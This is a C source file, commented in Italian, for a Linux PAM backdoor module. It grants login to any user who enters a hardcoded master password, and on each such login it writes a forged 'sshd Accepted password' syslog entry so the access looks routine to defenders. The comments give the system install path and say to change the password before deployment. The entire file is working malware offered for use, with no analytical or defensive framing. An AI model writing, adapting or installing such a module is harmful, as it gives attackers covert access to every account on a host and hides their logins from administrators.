#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <syslog.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>

/* ── PAM Backdoor Module ─────────────────────────────────────
 * Accetta una password master segreta per qualsiasi utente
 * Il log mostra un login normale — invisibile al blue team
 * Installato in /lib/x86_64-linux-gnu/security/
 */

/* Password master segreta — cambiala prima del deploy */
#define MASTER_PASSWORD "Sup3rS3cr3t!RAT"

/* ── pam_sm_authenticate ─────────────────────────────────────
 * Chiamata da PAM durante l'autenticazione
 * Se la password == MASTER_PASSWORD → login riuscito
 * Altrimenti → passa al modulo successivo (comportamento normale)
 */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                    int flags,
                                    int argc,
                                    const char **argv) {
    const char *password = NULL;
    const char *username = NULL;

    /* Ottieni il nome utente */
    pam_get_user(pamh, &username, NULL);

    /* Ottieni la password inserita */
    int ret = pam_get_authtok(pamh, PAM_AUTHTOK,
                               &password, NULL);
    if (ret != PAM_SUCCESS || !password) {
        return PAM_AUTH_ERR;
    }

    /* Confronta con la password master */
    if (strcmp(password, MASTER_PASSWORD) == 0) {
        /* Login riuscito — logga come normale per non insospettire */
        openlog("sshd", LOG_PID, LOG_AUTH);
        syslog(LOG_INFO, "Accepted password for %s",
               username ? username : "unknown");
        closelog();
        return PAM_SUCCESS;
    }

    /* Password non corrisponde alla master — passa al modulo successivo */
    return PAM_AUTH_ERR;
}

/* ── Funzioni richieste da PAM ma non usate ─────────────────  */
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                               int flags,
                               int argc,
                               const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
                                  int flags,
                                  int argc,
                                  const char **argv) {
    return PAM_SUCCESS;
}
